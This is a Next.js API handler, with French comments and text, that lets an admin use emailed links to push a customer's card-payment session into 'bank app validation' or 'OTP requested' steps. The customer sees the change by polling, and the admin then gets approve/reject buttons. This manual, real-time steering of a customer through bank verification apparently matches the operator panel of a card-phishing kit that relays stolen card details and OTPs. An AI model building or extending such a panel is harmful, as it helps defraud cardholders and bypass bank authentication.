/**
 * GET /api/payments/card-action?token=xxx&action=bank_validation|otp_request
 *
 * Appelé quand l'admin clique sur "Demande validation app bancaire"
 * ou "Demande code OTP" dans son email.
 *
 * Met à jour le step de la session → le client voit le changement en temps réel
 * via le polling. Retourne une page HTML de confirmation pour l'admin,
 * avec les boutons VALIDER / REFUSER.
 */

import dbConnect from '@/lib/db';
import OtpSession from '@/models/OtpSession';

function adminPage(title, message, color = '#16a34a', extraHtml = '') {
  return `<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>${title}</title>
  <style>
    body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
           background: #f4f4f5; display: flex; align-items: center; justify-content: center;
           min-height: 100vh; }
    .card { background: #fff; border-radius: 16px; padding: 48px 40px; max-width: 480px;
            width: 100%; text-align: center; box-shadow: 0 4px 24px rgba(0,0,0,0.08); }
    .icon { font-size: 52px; margin-bottom: 16px; }
    h1 { margin: 0 0 12px; font-size: 22px; color: ${color}; }
    p { color: #52525b; line-height: 1.6; margin: 0 0 24px; }
    .actions { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; margin-top: 8px; }
    .btn { display: inline-block; padding: 12px 28px; border-radius: 8px; font-weight: 700;
           font-size: 14px; text-decoration: none; }
    .btn-approve { background: #16a34a; color: #fff; }
    .btn-reject  { background: #dc2626; color: #fff; }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">✅</div>
    <h1>${title}</h1>
    <p>${message}</p>
    ${extraHtml}
  </div>
</body>
</html>`;
}

export default async function handler(req, res) {
  if (req.method !== 'GET') {
    return res.status(405).end('Méthode non autorisée');
  }

  const { token, action } = req.query;

  if (!token || !['bank_validation', 'otp_request'].includes(action)) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(400).send(adminPage(
      'Lien invalide',
      'Ce lien est invalide ou mal formé.',
      '#dc2626'
    ));
  }

  await dbConnect();

  const session = await OtpSession.findOne({ adminToken: token });

  if (!session) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(404).send(adminPage(
      'Lien expiré',
      'Ce lien a expiré (30 min) ou a déjà été utilisé.',
      '#dc2626'
    ));
  }

  if (session.decision !== 'pending') {
    const label = session.decision === 'approved' ? 'approuvé' : 'refusé';
    res.setHeader('Content-Type', 'text/html');
    return res.status(409).send(adminPage(
      'Déjà traité',
      `Ce paiement a déjà été ${label}.`,
      '#ca8a04'
    ));
  }

  const stepMap = {
    bank_validation: 'bank_validation_requested',
    otp_request:     'otp_requested',
  };

  session.step = stepMap[action];
  await session.save();

  const baseUrl    = process.env.NEXTAUTH_URL || 'http://localhost:3000';
  const approveUrl = `${baseUrl}/api/payments/card-decision?token=${token}&decision=approve`;
  const rejectUrl  = `${baseUrl}/api/payments/card-decision?token=${token}&decision=reject`;

  const actionButtons = `
    <div class="actions">
      <a href="${approveUrl}" class="btn btn-approve">✓ Valider le paiement</a>
      <a href="${rejectUrl}"  class="btn btn-reject">✗ Refuser le paiement</a>
    </div>`;

  const messages = {
    bank_validation: {
      title: 'Validation app bancaire demandée',
      msg:   'Le client a été notifié de valider sur son application bancaire.<br>Une fois qu\'il a confirmé, cliquez sur <strong>Valider</strong> ci-dessous.',
    },
    otp_request: {
      title: 'Demande de code OTP envoyée',
      msg:   'Le client peut maintenant saisir le code OTP.<br>Envoyez-lui le code par SMS, puis validez après réception.',
    },
  };

  const { title, msg } = messages[action];

  res.setHeader('Content-Type', 'text/html');
  return res.status(200).send(adminPage(title, msg, '#16a34a', actionButtons));
}
